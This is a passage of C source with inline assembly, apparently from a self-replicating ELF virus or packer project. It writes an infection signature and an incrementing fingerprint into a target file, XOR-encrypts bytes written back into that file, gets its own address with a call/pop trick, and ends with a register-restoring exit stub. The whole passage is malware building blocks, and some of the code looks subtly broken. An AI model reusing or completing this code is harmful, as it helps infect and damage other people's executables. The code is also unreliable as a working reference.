		ft_putstr(name_new);
		*(long long *)fingerprint = address_of_main - sizeof(long long);
	}
	ft_putstr(fingerprint);

	i = 7;
	while(i >= 0)
	{
		if(fingerprint[i] == '9')
		{
			fingerprint[i] = '0';
		}
		else
		{
			fingerprint[i]++;
			break;
		}
		i--;
	}
	size = write(fd,sig, sizeof(sig));
	ft_putstr(fingerprint);
	size += write(fd,fingerprint, sizeof(fingerprint));
	return (size);
}

size_t crypter(char *read, size_t size, char key, int fd)
{
	char tab[2];
	tab[0]=0;
	tab[1]=0;
size_t i ;
	if(size)
	{
		i = 0;
		lseek(fd, (off_t)size, SEEK_CUR);
		// ft_putnbr(lseek(fd, (off_t)size, SEEK_CUR));
		// ft_putstr("\n");
		// ft_putnbr(size);
		// ft_putstr("\n");
		tab[(size - 1) % 2] = read[size + 1];
		while ((int)size > 0)
		{
		// 	ft_putnbr(size);
		// ft_putstr("\\");
			tab[size % 2] = (read[size] ^ tab[(size - 1) % 2]);
			i += write(fd, &(tab[size % 2]), 1);
			lseek(fd, (off_t)-2, SEEK_CUR);
			size--;
		}
		tab[size % 2] = (read[size] ^ key);
		i += write(fd, &(tab[size % 2]), 1);
		// ft_putstr("bite\n");
		lseek(fd, (off_t)0, SEEK_END);
		ft_putnbr(lseek(fd, (off_t)0, SEEK_END));
		// ft_putstr("\n");
		size--;
		return (i);
	}
}

unsigned long get_eip(void)
{
	__asm__("call yeah\n"
	        ".globl yeah\n"
	        "yeah:\n"
	        "popq %rax");
}
void end_code() {
__asm__(".globl myend\n"
        "myend:	     \n"
//        "int3\n"
		"popq %r15\n"
        "popq %r14\n"
        "popq %r13\n"
        "popq %r12\n"
        "popq %r11\n"
        "popq %r10\n"
        "popq %r9\n"
        "popq %r8\n"
        "popq %rdi\n"
        "popq %rsi\n"
        "popq %rdx\n"
        "popq %rcx\n"
        "popq %rbx\n"
        "popq %rax\n"
        "mov $1,%rax \n"
        "mov $0,%rbx \n"
        "int $0x80   \n");

}
